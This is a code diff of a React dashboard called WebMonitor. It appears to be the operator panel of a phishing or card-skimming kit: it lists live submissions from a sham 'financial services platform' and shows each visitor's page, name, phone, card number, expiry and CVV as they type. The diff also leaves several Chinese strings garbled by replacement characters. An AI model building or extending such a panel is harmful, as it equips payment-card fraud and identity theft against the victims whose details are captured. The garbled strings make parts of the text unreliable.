@@ -110,7 +110,7 @@ const submissionData: UserSubmission[] = [
     status: "processing",
     statusText: "处理中",
     submissionType: "personal_info",
-    websiteName: "金���服务平台",
+    websiteName: "金融服务平台",
     currentPage: "/profile/personal-info",
     userName: "张小明",
     userLocation: "北京市���阳区",
@@ -390,7 +390,7 @@ export function WebMonitor() {
                 ? 'flash-submit'
                 : ''
             }`}>
-              {/* 顶部：编号、前台页面、正在payment页面 */}
+              {/* 顶部：编号、前台页面、���在payment页面 */}
               <div className="flex items-center justify-between mb-1 pb-1 border-b border-gray-100">
                 <div className="flex items-center gap-3">
                   <div className="flex items-center gap-1">
@@ -485,7 +485,7 @@ export function WebMonitor() {
                 </div>
               </div>
 
-              {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
+              {/* 中部：卡的类型、手机号、姓名、卡号、有效期���CVV */}
               {(() => {
                 // 检查是否有用户实际输入数据
                 const hasUserData = submission.realtimeInput && (
@@ -734,9 +734,14 @@ export function WebMonitor() {
         <div className="mt-6 pt-4 border-t border-border">
           <div className="text-xs text-muted-foreground">
             共监控 {filteredSubmissions.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
-            {hideEmptyData && submissions.length !== filteredSubmissions.length && (
+            {hideEmptyData && !isRefreshing && submissions.length !== filteredSubmissions.length && (
               <span className="text-orange-600 ml-2">
                 (已隐藏 {submissions.length - filteredSubmissions.length} 个无数据项)
+              </span>
+            )}
+            {isRefreshing && (
+              <span className="text-blue-600 ml-2">
+                (正在刷新页面，清除离线用户...)
               </span>
             )}
           </div>
